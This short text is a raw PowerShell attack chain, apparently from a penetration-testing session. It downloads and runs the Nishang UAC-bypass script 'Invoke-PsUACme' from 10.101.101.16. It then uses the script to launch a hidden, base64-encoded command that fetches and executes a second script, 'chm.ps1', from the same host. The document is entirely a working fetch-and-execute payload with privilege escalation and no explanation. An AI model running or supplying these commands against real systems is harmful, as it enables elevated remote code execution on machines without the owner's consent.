IEX (New-Object System.Net.WebClient).DownloadString('http://10.101.101.16/nishang/Escalation/Invoke-PsUACme.ps1')
Invoke-PsUACme -method oobe -Payload 'powershell -win hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwADEALgAxADAAMQAuADEANgAvAGMAaABtAC4AcABzADEAJwApAA=='
